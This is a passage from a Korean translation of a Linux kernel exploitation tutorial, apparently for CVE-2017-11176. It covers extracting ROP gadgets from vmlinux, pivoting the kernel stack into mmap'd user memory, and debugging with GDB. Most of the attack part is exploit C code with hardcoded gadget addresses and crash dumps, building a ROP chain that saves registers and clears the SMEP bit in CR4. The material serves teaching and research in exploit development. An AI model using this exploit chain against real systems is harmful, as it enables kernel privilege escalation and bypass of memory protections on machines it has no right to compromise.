                 0x0000000000884000 0x0000000000884000  R E    200000
  LOAD           0x0000000000c00000 0xffffffff81a00000 0x0000000001a00000
                 0x0000000000225bd0 0x0000000000225bd0  RWE    200000
  LOAD           0x0000000001000000 0xffffffffff600000 0x0000000001c26000
                 0x00000000000008d8 0x00000000000008d8  R E    200000
  LOAD           0x0000000001200000 0x0000000000000000 0x0000000001c27000
                 0x000000000001ff58 0x000000000001ff58  RW     200000
  LOAD           0x0000000001247000 0xffffffff81c47000 0x0000000001c47000
                 0x0000000000144000 0x0000000000835000  RWE    200000
  NOTE           0x0000000000760f14 0xffffffff81560f14 0x0000000001560f14
                 0x000000000000017c 0x000000000000017c         4

 Section to Segment mapping:
  Segment Sections...
   00     .text .notes __ex_table .rodata __bug_table .pci_fixup __ksymtab __ksymtab_gpl __kcrctab __kcrctab_gpl __ksymtab_strings __init_rodata __param __modver 
   01     .data 
   02     .vsyscall_0 .vsyscall_fn .vsyscall_gtod_data .vsyscall_1 .vsyscall_2 .vgetcpu_mode .jiffies .fence_wdog_jiffies64 
   03     .data.percpu 
   04     .init.text .init.data .x86_cpu_dev.init .parainstructions .altinstructions .altinstr_replacement .exit.text .smp_locks .data_nosave .bss .brk 
   05     .notes 
```

특히 *vmlinux*는 실행 가능해 보이는 **.init.text**섹션을 가지고 있다(**-t** 옵션을 사용하라):

```plaintext
[25] .init.text
       PROGBITS               PROGBITS         ffffffff81c47000  0000000001247000  0
       000000000004904a 0000000000000000  0                 16
       [0000000000000006]: ALLOC, EXEC
```

이 섹션은 부팅 과정(boot process)에서만 쓰이는 코드에 대해 설명(describe)한다. 이 섹션에 속한 코드는 다음과 같이 정의된 **\_\_init** 전처리기 매크로를 통해 얻을 수 있다:

```c
#define __init      __section(.init.text) __cold notrace
```

다음은 예시이다:

```c
// [mm/slab.c]

/*
 * Initialisation.  Called after the page allocator have been initialised and
 * before smp_init().
 */
void __init kmem_cache_init(void)
{
  // ... cut ...
}
```

**초기화 단계가 끝나면 이 코드는 메모리와의 매핑이 해제된다**. 다시 말해 이 섹션에 속한 가젯을 이용하면 커널 영역에서 page fault가 발생하고, 커널 크래시가 나게 된다(이전 섹션 참고).

(다른 실행 가능한 특별한 섹션엔 다른 함정이 있기 때문에) "특별한 섹션"에서 가젯을 찾는 것은 그만두고 ".text" 섹션에서만 찾아보기로 한다. .text 섹션의 시작과 끝 주소는 **\_text**와 **\_etext** 심볼을 통해 찾을 수 있다:

```bash
$ egrep " _text$| _etext$" System.map-2.6.32                                          
ffffffff81000000 T _text
ffffffff81560f11 T _etext
```

혹은 *readelf*  를 이용해서도 찾을 수 있다(-t 옵션):

```plaintext
  [ 1] .text
       PROGBITS               PROGBITS         ffffffff81000000  0000000000200000  0
       0000000000560f11 0000000000000000  0                 4096
       [0000000000000006]: ALLOC, EXEC
```

다음 명령어로 모든 가젯을 추출해보자:

```bash
$ ./ROPgadget.py --binary vmlinux-2.6.32 --range 0xfffffff81000000-0xffffffff81560f11 | sort > gadget.lst
```

**주의**: *\_text* 와 *\_etext*  사이의 가젯은 여러 이유로 인해 런타임에 100% 유효하지는 않다. ROP-chain을 실행하기 전에 메모리를 살펴봐야 한다 ("Debugging the kernel with GDB 참고).

이제 ROP를 할 준비가 되었다.
- - -
## Stack Pivoting

이전 섹션에서는 다음 것들을 보았다:

* 유저 영역 코드로 점프하려고 하면 SMEP로 인해 커널 크래시(page fault)가 발생한다.
* SMEP는 CR4의 비트를 뒤집어 무력화시킬 수 있다.
* *.text* 섹션의 가젯만을 *ROPgadget* 으로 실행한다.

"Core Concepts #4" 섹션에서 syscall 코드를 실행하는 중엔 커널 스택(rsp)이 현재의 *kernel thread stack*  을 가리키고 있는 것을 보았다. 이 섹션에선 arbitrary call primitive를 이용하여 스택을 유저 영역의 것으로 pivot할 것이다. 그렇게 함으로써 "가짜" 스택을 컨트롤하고 우리의 ROP-chain을 실행할 수 있게 될 것이다.

### Analyze Attacker-Controlled Data

*\_\_wake\_up\_common()*  함수는 [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 자세히 분석하였다. 상기해보면 코드는 이랬다:

```c
static void __wake_up_common(wait_queue_head_t *q, unsigned int mode,
            int nr_exclusive, int wake_flags, void *key)
{
    wait_queue_t *curr, *next;

    list_for_each_entry_safe(curr, next, &q->task_list, task_list) {
        unsigned flags = curr->flags;

        if (curr->func(curr, mode, wake_flags, key) &&
                (flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)
            break;
    }
}
```

이는 다음을 통해 호출된다(우린 재할당을 통해 *nlk* 의 내용을 거의 완전히 컨트롤했다):

```c
__wake_up_common(&nlk->wait, TASK_INTERRUPTIBLE, 1, 0, NULL)
```

특히 arbitrary call primitive는 여기서 호출된다:

```asm
ffffffff810618f7:       44 8b 20                mov    r12d,DWORD PTR [rax]       // "flags = curr->flags"
ffffffff810618fa:       4c 89 f1                mov    rcx,r14                    // 4th arg: "key"
ffffffff810618fd:       44 89 fa                mov    edx,r15d                   // 3nd arg: "wake_flags"
ffffffff81061900:       8b 75 cc                mov    esi,DWORD PTR [rbp-0x34]   // 2nd arg: "mode"
ffffffff81061903:       48 89 c7                mov    rdi,rax                    // 1st arg: "curr"
ffffffff81061906:       ff 50 10                call   QWORD PTR [rax+0x10]       // ARBITRARY CALL PRIMITIVE
```

익스플로잇을 재실행해보자:

```plaintext
...
[+] g_uland_wq_elt addr = 0x602860
[+] g_uland_wq_elt.func = 0x4014c4
...
```

크래시가 일어날 때의 레지스터 상태는 다음과 같다:

```plaintext
[  453.993810] RIP: 0010:[<00000000004014c4>]  [<00000000004014c4>] 0x4014c4
                          ^ &payload()
[  453.993932] RSP: 0018:ffff88001b527e60  EFLAGS: 00010016
                         ^ kernel thread stack top
[  453.994003] RAX: 0000000000602860 RBX: 0000000000602878 RCX: 0000000000000000
                    ^ curr                ^ &task_list.next     ^ "key" arg
[  453.994086] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000602860
                    ^ "wake_flags" arg    ^ "mode" arg          ^ curr
[  453.994199] RBP: ffff88001b527ea8 R08: 0000000000000000 R09: 00007fc0fa180700
                    ^ thread stack base   ^ "key" arg           ^ ???
[  453.994275] R10: 00007fffa3c8b860 R11: 0000000000000202 R12: 0000000000000001
                    ^ ???                 ^ ???                 ^ curr->flags
[  453.994356] R13: ffff88001bdde6b8 R14: 0000000000000000 R15: 0000000000000000
                    ^ nlk->wq [REALLOC]   ^ "key" arg           ^ "wake_flags" arg
```

오... 아주 운이 좋은 것 같다! **rax**, **rbx**, 그리고 **rdi**가 유저 영역 wait queue element를 가리키고 있다. 물론 이것은 우연이 아니다. 이게 처음에 이 arbitrary call primitive를 선택한 또 다른 이유이다.

### The Pivot

**스택은 *rsp*  레지스터에 의해서만 정의된다는 것**을 기억하자. 우리가 컨트롤할 수 있는 레지스터 중 하날 이용하여 rsp 레지스터를 덮어씌워보자. 이런 상황에 일반적으로 쓰이는 가젯은 이것이다:

```plaintext
xchg rsp, rXX ; ret
```

이는 *rsp*  값을 저장하며 컨트롤하는 레지스터의 값으로 바꿔준다. 따라서 나중에 스택 포인터를 복구하는 데 도움이 된다.

**노트**: 대신 *mov*  가젯을 사용할 수도 있지만 사용하게 되면 나중에 스택을 보수(repair)할 수 없기 때문에 현재의 스택 포인터 값을 잃게 된다. 완전히 맞는 말은 아니다. 스택 레이아웃이 알려져 있고 결정적이기(deterministic) 때문에 "고정된 오프셋"을 더할 수도 있고 RBP나 *kernel_stack*  변수를 이용하여 스택을 고칠(repair) 수도 있다. *xchg*  명령어를 사용하면 일이 더 간단해질 뿐이다.

```bash
$ egrep "xchg [^;]*, rsp|xchg rsp, " ranged_gadget.lst.sorted
0xffffffff8144ec62 : xchg rsi, rsp ; dec ecx ; cdqe ; ret
```

우리의 커널 이미지에선 해당 가젯이 하나밖에 없는 것 같다. 게다가 *rsi*  값이 0x0000000000000001이다(값을 바꿀 수 없다). 이는 **주소 0에 있는 페이지를 매핑하는 것**이 "NULL-deref" 버그 익스플로잇을 방지하기 위해 **더이상 가능하지 않다는 것**을 알려준다.

"esp" 레지스터를 추가해서 더 많은 결과를 찾아보자:

```bash
$ egrep "(: xchg [^;]*, esp|: xchg esp, ).*ret$" ranged_gadget.lst.sorted
...
0xffffffff8107b6b8 : xchg eax, esp ; ret
...
```

그러나 여기의 *xchg*  명령어는 32비트 레지스터에만 작동한다. 즉 **32개의 최상위 비트가 0이라는 것이다!**

아직 확신이 안 든다면 다음 프로그램을 실행(하고 디버깅)해보라:

```bash
# Build-and-debug with: as test.S -o test.o; ld test.o; gdb ./a.out

.text
.global _start

_start:
  mov $0x1aabbccdd, %rax
  mov $0xffff8000deadbeef, %rbx
  xchg %eax, %ebx                 # <---- check "rax" and "rbx" past this instruction (gdb)
```

즉 스택 피벗 가젯을 실행한 후의 64비트 레지스터는 다음과 같아진다:

* **rax** = 0xffff88001b527e60 & 0x00000000ffffffff = 0x000000001b527e60
* **rsp** = 0x0000000000602860 & 0x00000000ffffffff = 0x0000000000602860

이는 가상 주소 매핑에서 유저 영역 주소의 범위가 0x0 부터 0x00007ffffffff000로 설정되어 있기 때문에 문제가 되지 않는다(Core Concepts #4 참고). 다시 말해 어떤 0x**00000000**XXXXXXXX주소든 유효한 유저 영역 주소이다.

이제 스택은 우리가 데이터를 제어하고 ROP 체인을 시작할 수 있는 유저 영역으로 pivot한다 스택 피벗 가젯을 실행시키기 전과 후의 레지스터 상태는 다음과 같다:

![Before/After Stack Pivot](https://blog.lexfo.fr/images/cve-2017-11176-linux/stack_pivot.png)

**오류 수정**: *ret*  명령어가 실행하기 전에 값을 "pop" 하기 때문에 *RSP* 는 *RDI*  뒤의 8바이트를 가리킨다(*private* 를 가리켜야 한다). 다음 섹션을 보라.

**노트**: *rax* 는 이전 *rsp*  값의 최하위 바이트를 가지고 있으므로 "랜덤한" 유저 영역 주소를 가리킨다.

### Dealing with Aliasing

진도를 빼기 전에 몇 가지 고려할 사항이 있다:

* 새 "가짜" 스택은 이제 wait queue element object 로 **aliasing**된다(유저 영역에서).
* 32개의 최상위 비트가 0이 되었으므로 가짜 스택은 0x100000000 보다 낮은 주소에 매핑되어야 한다.

당장은 **g\_uland\_wq\_eld**가 전역으로 선언되어 있다(= *bss*). 주소는 0x100000000보다 낮은 "0x602860"이다.

Aliasing은 다음과 같기 때문에 문제가 될 수 있다:

* *func*  가젯으로 "점프하기"(jump over) 위해(i.e. don't execute the "stack pivot" gadget again) **stack lifting** 가젯을 사용하도록 강제한다.
* wait queue element가 유효한 상태로 있어야 하기 때문에 (in *\_\_wake\_up\_common()*) 가젯에 제한을 부과한다.

이러한 "aliasing" 문제를 다루기 위한 두 가지 방법이 있다.

1. 가짜 스택과 wait queue를 aliased된 상태로 유지하고 제한된(constrained) 가젯**stack lifting**
2. *g\_uland\_wq\_eld* 를 "더 높은" 메모리 주소로 옮긴다(after the 0x100000000 mark).

두 방법 다 작동한다.

예를 들어, 첫 방법을 적용해보고 싶다면 *\_\_wake\_up\_common()* 의 *break*  조건 때문에 다음 가젯 주소의 최하위 비트가 설정되어 있어야 한다:

```c
(flags & WQ_FLAG_EXCLUSIVE)   // WQ_FLAG_EXCLUSIVE == 1
```

이 예시의 경우 첫 번째 조건은 최하위 비트가 설정되어 있는 *NOP*  가젯을 사용하여 간단히 조건을 넘을 수 있다:

```asm
0xffffffff8100ae3d : nop ; nop ; nop ; ret    // <---- valid gadget
0xffffffff8100ae3e : nop ; nop ; ret          // <---- BAD GADGET
```

대신 **우리는 두 번째 방법을 적용해볼 것이다**. 이유는 두 번째 방법이 더 "흥미롭고", 덜 *gadget-dependent* 하고 익스플로잇하면서 가끔 쓰이는 방법을 보여주기 때문이다(*having addresses relative to each other*). 게다가 aliasing에 의한 제약이 줄기 때문에 ROP-chain에 사용할 가젯의 선택폭이 넓어진다.

우리의 (유저 영역의) wait queue element를 임의적인 위치에서 선언하기 위해선 *MAX\_FIXED*  인자를 통해 **mmap()** syscall을 사용해야 한다. "가짜 스택"을 위해서도 같은 일을 해줄 것이다. **둘 다 다음의 속성과 연결되어 있다(linked with):**

```plaintext
ULAND_WQ_ADDR = FAKE_STACK_ADDR + 0x100000000
```

다시 말하자면 이것이다:

```
(ULAND_WQ_ADDR & 0xffffffff) == FAKE_STACK_ADDR
 ^ pointed by RAX before XCHG   ^ pointed by RSP after XCHG
 ```
 
 이것은 *allocate\_uland\_structs()*  에 구현되어 있다:
 
 ```c
 static int allocate_uland_structs(void)
{
  // arbitrary value, must not collide with already mapped memory (/proc/<PID>/maps)
  void *starting_addr = (void*) 0x20000000;

  // ... cut ...

  g_fake_stack = (char*) _mmap(starting_addr, 4096, PROT_READ|PROT_WRITE,
    MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);

  // ... cut ...

  g_uland_wq_elt = (struct wait_queue*) _mmap(g_fake_stack + 0x100000000, 4096, PROT_READ|PROT_WRITE,
    MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);

  // ... cut ...
}
```

**주의**: *MAP_FIXED* 를 사용하는 것은 존재하는 메모리를 "overlap"할 수 있다! 더 나은 implementation을 위해선 *starting_addr*  주소가 이미 쓰이지 않았는지(예 : */proc/&lt;PID>/maps* 체크) 확인해야 한다. *mmap()*  syscall 구현 방식(implementation)을 보면 많은 것을 배울 수 있다. **훌륭한** 연습거리다.

"스택 피벗 가젯"을 실행한 후의 익스플로잇 메모리 레이아웃은 다음과 같아질 것이다:

![Aliasing Tricks](https://blog.lexfo.fr/images/cve-2017-11176-linux/aliasing.png)

익스플로잇 코드를 업데이트해보자(주의: *g_uland_wq_elt* 는 이제 포인터이므로 코드를 알맞게 수정하라):

```c
// 'volatile' forces GCC to not mess up with those variables
static volatile struct list_head  g_fake_next_elt;
static volatile struct wait_queue *g_uland_wq_elt;
static volatile char *g_fake_stack;

// kernel functions addresses
#define PANIC_ADDR ((void*) 0xffffffff81553684)

// kernel gadgets in [_text; _etext]
#define XCHG_EAX_ESP_ADDR ((void*) 0xffffffff8107b6b8)

static int payload(void);

// ----------------------------------------------------------------------------

static void build_rop_chain(uint64_t *stack)
{
  memset((void*)stack, 0xaa, 4096);

  *stack++ = 0;
  *stack++ = 0xbbbbbbbbbbbbbbbb;
  *stack++ = 0xcccccccccccccccc;
  *stack++ = 0xdddddddddddddddd;

  // FIXME: implement the ROP-chain
}

// ----------------------------------------------------------------------------

static int allocate_uland_structs(void)
{
  // arbitrary value, must not collide with already mapped memory (/proc/<PID>/maps)
  void *starting_addr = (void*) 0x20000000;
  size_t max_try = 10;

retry:
  if (max_try-- <= 0)
  {
    printf("[-] failed to allocate structures at fixed location\n");
    return -1;
  }

  starting_addr += 4096;

  g_fake_stack = (char*) _mmap(starting_addr, 4096, PROT_READ|PROT_WRITE,
    MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);
  if (g_fake_stack == MAP_FAILED)
  {
    perror("[-] mmap");
    goto retry;
  }

  g_uland_wq_elt = (struct wait_queue*) _mmap(g_fake_stack + 0x100000000, 4096, PROT_READ|PROT_WRITE,
    MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);
  if (g_uland_wq_elt == MAP_FAILED)
  {
    perror("[-] mmap");
    munmap((void*)g_fake_stack, 4096);
    goto retry;
  }

  // paranoid check
  if ((char*)g_uland_wq_elt != ((char*)g_fake_stack + 0x100000000))
  {
    munmap((void*)g_fake_stack, 4096);
    munmap((void*)g_uland_wq_elt, 4096);
    goto retry;
  }

  printf("[+] userland structures allocated:\n");
  printf("[+] g_uland_wq_elt = %p\n", g_uland_wq_elt);
  printf("[+] g_fake_stack   = %p\n", g_fake_stack);

  return 0;
}

// ----------------------------------------------------------------------------

static int init_realloc_data(void)
{
  // ... cut ...

  nlk_wait->task_list.next = (struct list_head*)&g_uland_wq_elt->task_list;
  nlk_wait->task_list.prev = (struct list_head*)&g_uland_wq_elt->task_list;

  // ... cut ...

  g_uland_wq_elt->func = (wait_queue_func_t) XCHG_EAX_ESP_ADDR; // <----- STACK PIVOT!

  // ... cut ...
}

// ----------------------------------------------------------------------------

int main(void)
{
  // ... cut ...

  printf("[+] successfully migrated to CPU#0\n");

  if (allocate_uland_structs())
  {
    printf("[-] failed to allocate userland structures!\n");
    goto fail;
  }

  build_rop_chain((uint64_t*)g_fake_stack);
  printf("[+] ROP-chain ready\n");

  // ... cut ...
}
```

**build\_rop\_chain()** 함수를 보고 알아챘을 수 있지만, 디버깅 목적으로 유효하지 않은 임시 ROP-chain을 설정해두었다. 첫 가젯의 주소가 "0ㅌ00000000"인 것은 **double fault**를 유발할 것이다.

익스플로잇을 실행해보자:
```plaintext
...
[+] userland structures allocated:
[+] g_uland_wq_elt = 0x120001000
[+] g_fake_stack   = 0x20001000
[+] g_uland_wq_elt.func = 0xffffffff8107b6b8
...
```

```plaintext
[   79.094437] double fault: 0000 [#1] SMP 
[   79.094738] CPU 0 
...
[   79.097909] RIP: 0010:[<0000000000000000>]  [<(null)>] (null)
[   79.097980] RSP: 0018:0000000020001008  EFLAGS: 00010012
[   79.098024] RAX: 000000001c123e60 RBX: 0000000000602c08 RCX: 0000000000000000
[   79.098074] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000120001000
[   79.098124] RBP: ffff88001c123ea8 R08: 0000000000000000 R09: 00007fa46644f700
[   79.098174] R10: 00007fffd73a4350 R11: 0000000000000206 R12: 0000000000000001
[   79.098225] R13: ffff88001c999eb8 R14: 0000000000000000 R15: 0000000000000000
...
[   79.098907] Stack:
[   79.098954]  bbbbbbbbbbbbbbbb cccccccccccccccc dddddddddddddddd aaaaaaaaaaaaaaaa
[   79.099209] <d> aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa
[   79.100516] <d> aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa
[   79.102583] Call Trace:
[   79.103844] Code:  Bad RIP value.
[   79.104686] RIP  [<(null)>] (null)
[   79.105332]  RSP <0000000020001008>
...
```

완벽하다. 정확히 예상했던 대로다! **RSP**는 *가짜 스택*  안에 있는 ROP-chain의 두 번째 가젯을 가리키고 있다. 주소 0(RIP=0)을 가리키고 있는 첫 번재 가젯을 실행하려다가 double fault가 발생했다.

**ret** 값을 *rip* 로 "pop"한 후에야 실행한다는 것을 명심하자.이게 RSP가 (첫 번째가 아닌) 두 번째 가젯을 가리키고 있는 이유이다.

이제 진짜 ROP-chain을 쓸 준비가 되었다!

**노트**: **double-fault를 발생시키면 커널 크래시가 발생하고 레지스터와 스택을 전부 dump하기 때문에 ROP-chain을 디버깅하는데 아주 좋다**. 이는 "poor man" 브레이크포인트이다😁.
- - -
## Debugging the kernel with GDB

초심자들에게 (SystemTap 없이) 커널을 디버깅하는 것은 겁나는 일이다. 이전 파트에서 우린 이미 커널을 디버깅하는 두 방법을 보았다:

* SystemTap
* netconsole

그러나 가끔은 더 "낮은 레벨"의 것들을 디버깅하여 단계적으로 실행하고 싶을 때가 있다.

어떤 다른 바이너리와 마찬가지로 **커널도 디버깅을 할 때 GDB를 사용할 수 있다.**

대부분의 가상화 소프트웨어는 "게스트" 시스템을 디버깅할 때 연결할 수 있는 **gdb server**를 설치한다(setup). 예를 들어 64비트 커널을 구동하고 있을 때, *vmware* 는 "8864" 포트에 *gdbserver* 를 설치한다. 그렇지 않다면 매뉴얼을 참고하라.

chaotic하고 concurrent한 커널의 특성 때문에 디버깅을 할 땐 **CPU 개수를 하나로 제한하는 것**이 좋다.

arbitrary call primitive를 디버깅하고 싶다고 가정해보자. 호출이 일어나기 직전에 브레이크포인트를 설정하고 싶을 수 있지만... 하지 마라! 이유는 많은 커널 경로(interrupts handler 포함)가 실제로 이 코드를 호출하기 때문이다. 즉, **자기 자신의 경로에 있지 않으면 계속 중단될 것이다(?)**.

방법은 버그/익스플로잇에 특정된 "잘 안 쓰이는" 경로에서 일찍 브레이크포인트를 거는 것이다. 우리의 경우는 *\_\_wake\_up()* (located at address 0xffffffff814b81c7) 을 호출하기 직전에 *netlink\_setsockopt()* 에서 브레이크한다:

```bash
$ gdb ./vmlinux-2.6.32 -ex "set architecture i386:x86-64" -ex "target remote:8864" -ex "b * 0xffffffff814b81c7" -ex "continue"
```

우리의 익스플로잇에선 스레드를 unblock하기 위해 2번, arbitrary call에 도달하기 위해 1번 총 3번을 이 코드에 도달하게 된다는 것을 기억하라. 즉 세 번째 브레이크까지는 **continue**를 하고 세 번째 브레이크에서부터 차근차근 디버깅을 해야 한다(with "ni" and "si"). 게다가, *\_\_wake\_up()* 은 *\_\_wake\_up\_common()*  전에 다른 호출을 issue하기 때문에 **finish**를 쓰고 싶을 것이다.

여기서부턴 그냥 "평범한" 디버깅이다.


**주의**: *gdb* 를 끄기(leave) 전에 **detach**하는 것을 잊지 말자. 가상화 툴을 혼란시키는 "이상한" 이슈로 이어질 수 있다.
- - -
## The ROP-Chain

우린 이전 섹션에서 arbitrary call primitive를 사용하기에 앞서 machine 상태(i.e. registers)를 분석했다. 32비트 레지스터를 사용하는 *xchg*  명령어를 통해 스택 피벗을 하는 가젯을 찾았다. 이로 인해 우리의 유저 영역 wait queue element가 aliased된다. 이를 처리하기 위해 간단한 트릭을 이용하여 유저 영역으로의 피벗은 유지하면서 aliasing을 피할 것이다. 이렇게 하면 나중의 가젯에 대한 제약을 완화시키고 스택 리프팅을 피하는 등에 도움이 된다.

우린 다음과 같은 일을 하는 ROP-chain을 만들 것이다:

* 나중에 복원을 하기 위해 ESP와 RBP를 유저 영역 메모리에 저장
* CR4의 SMEP 비트 값을 바꿔 SMEP를 무력화(Defeating SMEP Strategies 참고)
* 페이로드의 wrapper로 점프

여기서 하는 ROP-chain은 "유저 영역의" ROP 익스플로잇과 굉장히 유사하다. 덧붙여서 **타겟이 뭔지에 따라 많이 달라진다.** 환경에 따라 더 좋은, 혹은 더 안 좋은 가젯을 가질 수 있다. 이건 그냥 타겟에서 사용 가능한 가젯들로 만든 ROP-chain이다.

**주의**: 드문 일이지만 사용하려는 가젯이 런타임 도중에 모종의 이유로 작동이 안 될 때가 있다(예: trampoline, kernel hooks, unmapped). 이를 방지하기 위해 ROP-chain을 실행하기 전에 break를 하고 가젯이 메모리에 예상대로 있는지 gdb를 통해 확인하자. 메모리에 없다면 그냥 다른 가젯을 사용하면 된다.

**주의-2**: 가젯이 "non-scratch" 레지스터를 수정한다면(우리가 rbp/rsp에 한 것처럼) ROP-chain 마지막에 레지스터를 원래대로 수정(repair)해줘야 한다.

### Unfortunate "CR4" gadgets

SMEP를 비활성화하는 것은 우리 ROP-chain의 첫 번째 "sub-chain"이 아니다(그전에 *ESP*를 저장할 것이다). 그러나 사용 가능한 가젯들이 *cr4*를 수정하기 때문에 *RBP*를 불러오기/저장하려면 가젯이 더 필요하다:

```bash
$ egrep "cr4" ranged_gadget.lst
0xffffffff81003288 : add byte ptr [rax - 0x80], al ; out 0x6f, eax ; mov cr4, rdi ; leave ; ret
0xffffffff81003007 : add byte ptr [rax], al ; mov rax, cr4 ; leave ; ret
0xffffffff8100328a : and bh, 0x6f ; mov cr4, rdi ; leave ; ret
0xffffffff81003289 : and dil, 0x6f ; mov cr4, rdi ; leave ; ret
0xffffffff8100328d : mov cr4, rdi ; leave ; ret                       // <----- will use this
0xffffffff81003009 : mov rax, cr4 ; leave ; ret                       // <----- will use this
0xffffffff8100328b : out 0x6f, eax ; mov cr4, rdi ; leave ; ret
0xffffffff8100328c : outsd dx, dword ptr [rsi] ; mov cr4, rdi ; leave ; ret
```

볼 수 있듯이, 여기 있는 모든 가젯에 *ret* 앞에 *leave* 인스트럭션이 있으므로 이들을 사용하면 ***RSP*와 *RBP*를 덮어씌워** ROP-chain을 깨뜨린다. 이때문에 *RSP*와 *RBP*를 저장해놨다가 복구해야 할 것이다.

### Save ESP/RBP

다음 네 가젯을 사용하여 ESP와 RSP 값을 저장할 것이다:

```asm
0xffffffff8103b81d : pop rdi ; ret
0xffffffff810621ff : shr rax, 0x10 ; ret
0xffffffff811513b3 : mov dword ptr [rdi - 4], eax ; dec ecx ; ret
0xffffffff813606d4 : mov rax, rbp ; dec ecx ; ret
```

임의의 메모리 영역에 쓰기를 하는 가젯이 "eax" (32비트)에서 값을 읽어오므로, *shr* 가젯을 이용하여 RBP 값을 두 번(낮은 비트와 높은 비트) 저장한다. ROP-chain은 여기서 선언된다:

```c
// gadgets in [_text; _etext]
#define XCHG_EAX_ESP_ADDR         ((uint64_t) 0xffffffff8107b6b8)
#define MOV_PTR_RDI_MIN4_EAX_ADDR ((uint64_t) 0xffffffff811513b3)
#define POP_RDI_ADDR              ((uint64_t) 0xffffffff8103b81d)
#define MOV_RAX_RBP_ADDR          ((uint64_t) 0xffffffff813606d4)
#define SHR_RAX_16_ADDR           ((uint64_t) 0xffffffff810621ff)

// ROP-chains
#define STORE_EAX(addr) \
  *stack++ = POP_RDI_ADDR; \
  *stack++ = (uint64_t)addr + 4; \
  *stack++ = MOV_PTR_RDI_MIN4_EAX_ADDR;

#define SAVE_ESP(addr) \
  STORE_EAX(addr);

#define SAVE_RBP(addr_lo, addr_hi) \
  *stack++ = MOV_RAX_RBP_ADDR;  \
  STORE_EAX(addr_lo); \
  *stack++ = SHR_RAX_16_ADDR; \
  *stack++ = SHR_RAX_16_ADDR; \
  STORE_EAX(addr_hi);
```

*build\_rop\_chain()*을 수정하자:

```c
static volatile uint64_t saved_esp;
static volatile uint64_t saved_rbp_lo;
static volatile uint64_t saved_rbp_hi;

static void build_rop_chain(uint64_t *stack)
{
  memset((void*)stack, 0xaa, 4096);

  SAVE_ESP(&saved_esp);
  SAVE_RBP(&saved_rbp_lo, &saved_rbp_hi);

  *stack++ = 0; // force double-fault

  // FIXME: implement the ROP-chain
}
```

진도를 나가기 전에 **이 지점까지 모든 것이 잘 되어가고 있는지** 알고 싶을 수 있다. 이전 섹션에서 설명한 대로 GDB를 이용해보라!

### Read/Write CR4 and dealing with "leave"

앞서 언급한 것처럼 우리의 가젯 중 *CR4*를 건드는 가젯은 모두 *ret* 앞에 *leave* 인스트럭션이 있다. 이는 다음과 같은 (순서로) 일을 한다:

1. RSP = RBP
2. RBP = pop()

이 ROP-chain에선 세 가젯을 사용할 것이다:

```asm
0xffffffff81003009 : mov rax, cr4 ; leave ; ret
0xffffffff8100328d : mov cr4, rdi ; leave ; ret
0xffffffff811b97bf : pop rbp ; ret
```

*RSP*가 *leave* 인스트럭션 실행 중에 덮어쓰이므로, 체인을 깨뜨리지 않는지 확인해봐야 한다(= *RSP*는 여전히 옳다(?)).

*RSP*가 *RBP*에 덮어쓰이므로 가젯을 실행하기 전에 RBP를 재작성할 것이다:

```c
#define POP_RBP_ADDR              ((uint64_t) 0xffffffff811b97bf)
#define MOV_RAX_CR4_LEAVE_ADDR    ((uint64_t) 0xffffffff81003009)
#define MOV_CR4_RDI_LEAVE_ADDR    ((uint64_t) 0xffffffff8100328d)

#define CR4_TO_RAX() \
  *stack++ = POP_RBP_ADDR; \
  *stack   = (unsigned long) stack + 2*8; stack++; /* skip 0xdeadbeef */ \
  *stack++ = MOV_RAX_CR4_LEAVE_ADDR; \
  *stack++ = 0xdeadbeef;  // dummy RBP value!

#define RDI_TO_CR4() \
  *stack++ = POP_RBP_ADDR; \
  *stack   = (unsigned long) stack + 2*8; stack++; /* skip 0xdeadbeef */ \
  *stack++ = MOV_CR4_RDI_LEAVE_ADDR; \
  *stack++ = 0xdeadbeef;  // dummy RBP value!
```

*leave* 명령어를 실행할 때 *RSP*는 *RBP*로 pop될 "0xdeadbeef" 라인을 가리키고 있다. 즉 다음 *ret* 인스트럭션은 우리의 체인으로 돌아올 것이다!

### Clearing SMEP bit

[Meeting Supervisor Mode Execution Prevention]() 섹션에서 언급한 것처럼, SMEP는 CR4의 20번째 비트가 설정되어 있을 때 활성화된다. 그러므로 다음 operation을 통해 비트를 clear할 수 있다:

```c
CR4 = CR4 & ~(1<<20)
```

이는 다음과 동일하다:

```c
CR4 &= 0xffffffffffefffff
```

앞의 ROP-chain과 마찬가지로 이 체인에도 다음의 가젯들을 사용할 것이다:

```asm
0xffffffff8130c249 : and rax, rdx ; ret
0xffffffff813d538d : pop rdx ; ret
0xffffffff814f118b : mov edi, eax ; dec ecx ; ret
0xffffffff8139ca54 : mov edx, edi ; dec ecx ; ret
```

**노트**: CR4의 최상위 32비트는 "뒤집어져서" 0이 된다. 이게 우리가 32비트 레지스터 가젯을 사용하는 이유이다.

이 체인을 이용하여 SMEP를 비활성화한다:

```c
#define AND_RAX_RDX_ADDR          ((uint64_t) 0xffffffff8130c249)
#define MOV_EDI_EAX_ADDR          ((uint64_t) 0xffffffff814f118b)
#define MOV_EDX_EDI_ADDR          ((uint64_t) 0xffffffff8139ca54)

#define SMEP_MASK (~((uint64_t)(1 << 20))) // 0xffffffffffefffff

#define DISABLE_SMEP() \
  CR4_TO_RAX(); \
  *stack++ = POP_RDI_ADDR; \
  *stack++ = SMEP_MASK; \
  *stack++ = MOV_EDX_EDI_ADDR; \
  *stack++ = AND_RAX_RDX_ADDR; \
  *stack++ = MOV_EDI_EAX_ADDR; \
  RDI_TO_CR4();

static void build_rop_chain(uint64_t *stack)
{
  memset((void*)stack, 0xaa, 4096);

  SAVE_ESP(&saved_esp);
  SAVE_RBP(&saved_rbp_lo, &saved_rbp_hi);
  DISABLE_SMEP();

  *stack++ = 0; // force double-fault

  // FIXME: implement the ROP-chain
}
```

